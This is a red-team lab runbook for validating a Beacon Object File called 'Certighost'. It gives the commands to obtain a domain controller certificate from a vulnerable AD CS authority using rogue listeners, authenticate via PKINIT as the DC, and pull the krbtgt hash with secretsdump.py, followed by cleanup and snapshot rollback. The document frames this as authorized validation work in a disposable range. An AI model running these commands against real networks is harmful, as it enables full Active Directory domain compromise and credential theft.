# Manual full-chain validation

This lab-only runbook validates the Certighost BOF through certificate issuance, PKINIT, and a narrowly scoped `krbtgt` replication proof. Use it only in an authorized disposable range. It uses placeholders instead of operation identifiers, credentials, timestamps, or raw secret values.

The chain proves:

1. BOF issuance on a vulnerable Enterprise CA.
2. Continuity between the caller-generated private key and issued certificate.
3. PKINIT as the selected domain controller machine account.
4. One-account DRSUAPI replication of `krbtgt` only.
5. Destruction of transient secrets and rollback of the DC and CA.

Do not substitute another target or broaden the replication query beyond `krbtgt`.

## Operator placeholders

```sh
export REPO_DIR='<CERTIGHOST_REPOSITORY>'
export RUN_DIR='<EPHEMERAL_RUN_DIRECTORY>'
export CALLBACK_HOST='<ROGUE_LISTENER_HOST_OR_IP>'
export CA_CONFIG='<CA_HOST>\<CA_NAME>'
export TEMPLATE='<ENROLLABLE_MACHINE_TEMPLATE>'
export TARGET_DC_DNS='<TARGET_DC_FQDN>'
export TARGET_DC_ACCOUNT='<TARGET_DC_NETBIOS>$'
export REALM='<AD_REALM>'

umask 077
mkdir -p "$RUN_DIR"
cd "$REPO_DIR"
```

Verify that the selected callback is Windows x64, runs in the intended enrollment identity, and has Apollo `execute_coff` version `3`. Record the identity as sanitized evidence without copying credentials or tokens.

## 1. Build and register the BOF

```sh
make bof
shasum -a 256 build/certighost.x64.o
```

Compare the digest with the reviewed artifact record for the current commit. In Mythic, run stock `register_file`, select `build/certighost.x64.o` in the file picker, and verify `certighost.x64.o` appears in the stock `execute_coff` `-Coff` picker. Do not use a target-side upload, shell copy, download, or certificate save path.

## 2. Generate a fresh key and DER CSR

```sh
openssl req -new -newkey rsa:2048 -nodes \
  -keyout "$RUN_DIR/target-dc.key.pem" \
  -out "$RUN_DIR/target-dc.csr.pem" \
  -subj "/CN=$TARGET_DC_DNS" \
  -addext "subjectAltName=DNS:$TARGET_DC_DNS"

openssl req -in "$RUN_DIR/target-dc.csr.pem" -outform DER \
  -out "$RUN_DIR/target-dc.csr.der"
openssl req -in "$RUN_DIR/target-dc.csr.pem" -noout -verify -subject
openssl base64 -A -in "$RUN_DIR/target-dc.csr.der" > "$RUN_DIR/target-dc.csr.der.b64"
```

Keep the private key only in the ephemeral run directory. PKINIT requires the key matching the issued certificate.

## 3. Start the scoped rogue listeners

Use the approved harness to start the rogue SMB/LSA and LDAP services. If the callback host also carries C2 traffic on TCP/445, preserve that transport with the validated multiplexer.

Required listener evidence:

```text
<CALLBACK_HOST>:445 listening
<CALLBACK_HOST>:389 listening
```

Capture only listener state and callback metadata. Do not retain authentication material obtained by the listeners.

## 4. Execute the exact mixed Apollo command

Apollo v3 expects one `base64` CSR followed by five `string` values:

```text
csr_der, ca_config, template, san_dns, cdc, rmd
```

Each `string` is packed by Apollo as UTF-8 bytes plus one terminal NUL. The BOF strips exactly one terminal NUL from text slices, rejects embedded NULs, and still accepts valid legacy all-base64 text slices without a NUL. New tasks must use the mixed form.

Copy the single line from `$RUN_DIR/target-dc.csr.der.b64` and replace `<CSR_DER_BASE64>` in this stock command:

```text
execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<CSR_DER_BASE64> string:<CA_HOST>\<CA_NAME> string:<ENROLLABLE_MACHINE_TEMPLATE> string:<TARGET_DC_FQDN> string:<ROGUE_LISTENER_HOST_OR_IP> string:<TARGET_DC_FQDN>
```

Sanitized concrete example:

```text
execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:<CSR_DER_BASE64> string:ra-ca01.certighost.redantonetta.test\REDANTONETTA-CERTIGHOST-CA string:Machine string:ra-dc01.certighost.redantonetta.test string:ra-listener.certighost.redantonetta.test string:ra-dc01.certighost.redantonetta.test
```

Successful vulnerable output contains:

```text
CERTIGHOST_RESULT disposition=3 request_id=<id> cert_encoding=base64 cert_der_bytes=<n> cert_base64_chars=<n>CERTIGHOST_CERT_BEGIN
<base64 DER certificate>
CERTIGHOST_CERT_END
```

Patched negative-control output contains no certificate block:

```text
certighost: request not issued (disposition=2 request_id=<id> last_status=0x80094800)
certighost: CA message: The request was denied.
```

Save the complete output as `$RUN_DIR/mythic-output.txt`. Stop if disposition is not `3`.

## 5. Extract and validate the certificate

```sh
awk '/CERTIGHOST_CERT_BEGIN/{capture=1;next}/CERTIGHOST_CERT_END/{capture=0}capture' \
  "$RUN_DIR/mythic-output.txt" | tr -d '[:space:]' | \
  openssl base64 -d -A -out "$RUN_DIR/issued-cert.der"

openssl x509 -inform DER -in "$RUN_DIR/issued-cert.der" \
  -out "$RUN_DIR/issued-cert.pem"
openssl x509 -in "$RUN_DIR/issued-cert.pem" -noout \
  -subject -issuer -serial -ext subjectAltName

openssl pkey -in "$RUN_DIR/target-dc.key.pem" -pubout -outform DER | \
  openssl dgst -sha256
openssl x509 -in "$RUN_DIR/issued-cert.pem" -pubkey -noout | \
  openssl pkey -pubin -outform DER | openssl dgst -sha256
```

The two SPKI digests must match. Then create a transient PFX with OpenSSL's hidden export-password prompt:

```sh
openssl pkcs12 -export \
  -inkey "$RUN_DIR/target-dc.key.pem" \
  -in "$RUN_DIR/issued-cert.pem" \
  -out "$RUN_DIR/issued-cert.pfx"
chmod 600 "$RUN_DIR/issued-cert.pfx"
```

Do not copy the key or PFX into evidence bundles.

## 6. Prepare and prove PKINIT

If the disposable DC baseline lacks PKINIT prerequisites, use the approved harness to import the lab CA trust, populate NTAuth, enroll or install the temporary KDC certificate, restart KDC, and synchronize attacker time. These changes must be covered by the DC rollback snapshot.

Run the approved PKINIT harness with the transient PFX. Required sanitized evidence is:

```text
principal = <TARGET_DC_ACCOUNT>@<REALM>
as_rep_tgt_obtained = true
ccache_bytes > 0
```

Retain only the principal and success metadata. Keep the ccache ephemeral and exclude it from reports and commits.

## 7. Prove krbtgt-only replication authority

Use the TGT only for the separately authorized one-account control:

```sh
KRB5CCNAME="$RUN_DIR/target-dc.ccache" \
  secretsdump.py -k -no-pass -just-dc-user 'krbtgt' \
  "$REALM/$TARGET_DC_ACCOUNT@$TARGET_DC_DNS"
```

Required sanitized proof:

```text
requested_account = krbtgt
account_result_count = 1
rid = 502
nt_hash_present = true
broad_dump_performed = false
```

Do not request additional accounts, perform a broad dump, or copy the raw hash into task output, chat, reports, or persistent notes.

## 8. Cleanup and rollback

First stop listeners and use the approved harness to delete any transient ccache, replication output, capture material, and credential output. Then remove the local run artifacts:

```sh
rm -f "$RUN_DIR/target-dc.key.pem" \
      "$RUN_DIR/target-dc.csr.pem" \
      "$RUN_DIR/target-dc.csr.der" \
      "$RUN_DIR/target-dc.csr.der.b64" \
      "$RUN_DIR/issued-cert.der" \
      "$RUN_DIR/issued-cert.pem" \
      "$RUN_DIR/issued-cert.pfx" \
      "$RUN_DIR/target-dc.ccache" \
      "$RUN_DIR/mythic-output.txt"
rmdir "$RUN_DIR" 2>/dev/null || true
```

Revert both disposable systems to their recorded baselines:

```sh
ludus snapshots revert <DC_PRE_PKINIT_SNAPSHOT> --vmids <DC_VMID>
ludus snapshots revert <CA_PRE_VALIDATION_SNAPSHOT> --vmids <CA_VMID>
```

Verify that temporary trust, KDC, certificate, callback, listener, request, and replication state is gone before closing the run. A subsequent validation must use a fresh callback, CSR, key, and ephemeral run directory.
